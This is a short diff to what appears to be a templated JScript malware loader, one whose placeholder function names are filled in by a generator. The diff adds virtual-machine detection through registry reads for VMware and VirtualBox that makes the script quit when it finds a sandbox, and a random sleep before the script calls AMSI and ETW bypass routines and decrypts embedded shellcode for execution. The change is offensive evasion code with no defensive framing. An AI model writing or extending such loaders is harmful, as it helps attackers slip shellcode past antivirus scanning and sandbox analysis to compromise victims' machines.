@@ -41,6 +41,17 @@ function {{ v.fn_sandbox }}() {
             if (d.ScreenWidth && d.ScreenWidth < 800) return true;
         }
     } catch(e2) {}
+    // VM registry key checks
+    try {
+        var sh = new ActiveXObject("WScript.Shell");
+        sh.RegRead("HKLM\\SOFTWARE\\VMware, Inc.\\VMware Tools\\InstallPath");
+        return true;
+    } catch(e) {}
+    try {
+        var sh2 = new ActiveXObject("WScript.Shell");
+        sh2.RegRead("HKLM\\SOFTWARE\\Oracle\\VirtualBox Guest Additions\\Version");
+        return true;
+    } catch(e) {}
     return false;
 }
 
@@ -61,6 +72,7 @@ function {{ v.fn_decrypt }}(d, k) {
 
 function {{ v.fn_exec }}() {
     if ({{ v.fn_sandbox }}()) { WScript.Quit(0); }
+    WScript.Sleep(2000 + Math.floor(Math.random() * 3000));
     {{ v.fn_amsi }}();
     {{ v.fn_etw }}();
     var sc  = {{ v.fn_decrypt }}({{ v.fn_hex2arr }}({{ v.var_sc }}), {{ v.fn_hex2arr }}({{ v.var_key }}));
